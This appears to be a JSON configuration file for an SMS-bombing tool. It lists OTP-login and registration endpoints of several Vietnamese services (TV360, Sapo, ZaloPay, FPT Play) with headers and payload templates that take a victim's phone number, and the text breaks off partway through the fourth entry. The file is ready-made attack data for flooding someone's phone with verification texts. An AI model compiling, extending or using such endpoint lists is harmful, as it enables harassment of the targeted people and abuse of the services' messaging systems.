{
  "sms_endpoints": [
    {
      "name": "TV360 Viettel",
      "url": "https://m.tv360.vn/public/v1/auth/get-otp-login",
      "method": "POST",
      "headers": {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "origin": "https://m.tv360.vn"
      },
      "payload_template": "{\"msisdn\":\"{phone}\"}",
      "is_json": true
    },
    {
      "name": "Sapo FNB",
      "url": "https://www.sapo.vn/fnb/sendotp",
      "method": "POST",
      "headers": {
        "content-type": "application/x-www-form-urlencoded",
        "referer": "https://www.sapo.vn/"
      },
      "payload_template": "phonenumber={phone}",
      "is_json": false
    },
    {
      "name": "ZaloPay Gateway",
      "url": "https://api.zalopay.vn/v2/account/phone/otp",
      "method": "POST",
      "headers": {
        "x-user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) ZaloPayClient/7.13.1",
        "content-type": "application/json"
      },
      "payload_template": "{\"feature\":\"register\",\"phone\":\"+84{phone_no_zero}\"}",
      "is_json": true
    },
    {
      "name": "FPT Play Auth",
      "url": "https://api.fptplay.net/profile/auth/otp",
      "method": "POST",
      "headers": { "content-type": "application/json" },
